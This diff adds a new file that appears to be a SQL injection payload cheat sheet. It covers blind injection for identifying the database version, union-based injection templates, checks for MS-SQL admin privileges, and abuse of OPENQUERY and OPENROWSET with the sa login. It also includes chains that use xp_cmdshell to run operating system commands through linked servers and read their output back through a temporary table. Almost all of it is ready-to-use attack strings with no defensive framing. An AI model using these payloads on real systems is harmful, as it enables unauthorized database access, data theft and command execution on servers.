@@ -1,0 +1,51 @@
+Identify sql Server through Blind SQL injection
+
+http://example.com/index.php?some_var=1/*!40017%20s*/
+
+MySQL is at least 4.0.17 if you get a different result.
+
+## String based (concat ||) ==> PostgreSQL, Oracle
+## String based (concat +) ==> MS-SQL, MS-Access
+
+Normal Union attack
+$var$quote_type AND 1=1;--
+$var$quote_type AND 1=0;--
+$var$quote_type union all select $select_statement where 1=0;--
+$var$quote_type AND 1=0 union all select $select_statement;--
+$var$quote_type AND 1=0 union all select $select_statement union all select $select_statement2;--
+
+
+MS-SQL
+
+Check if we are admins
+IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E))
+
+
+Check things like
+MSSQL_OPENQUERY
+(select 1 from OPENQUERY([$servername],'select 1'))
+
+
+MSSQL_OPENROWSET
+(select 1 from OPENROWSET('SQLOLEDB','';'sa';'$pass','select 1'))
+
+or
+(select 1 from OPENROWSET('SQLOLEDB','';'$user';'$pass','select 1'))
+
+
+If we have a linked server and sa
+select * from OPENQUERY([TMP],'select 1;exec xp_cmdshell ''osql -E -Q "CREATE TABLE TMP_TMP (id int identity(1,1),cmd varchar(8000))"'';')
+select * from OPENQUERY([TMP],'select 1;insert TMP_TMP exec xp_cmdshell ''dir c:\'';')
+select count(*) from TMP_TMP
+select 1 where 1=(select cmd from TMP_TMP where id=7)
+select * from OPENQUERY([TMP],'select 1;exec xp_cmdshell ''osql -E -Q "DROP TABLE TMP_TMP"'';')
+
+If already sa
+select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select @@version')
+select * from OPENROWSET('SQLOLEDB','';;,'select @@version')
+
+Other things todo
+select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;exec xp_cmdshell ''osql -E -Q "CREATE TABLE TMP_TMP (id int identity(1,1),cmd varchar(8000))"'';')
+select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;insert TMP_TMP exec xp_cmdshell ''dir c:\''')
+select * from master..TMP_TMP
+select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;exec xp_cmdshell ''osql -E -Q "DROP TABLE TMP_TMP"'';')
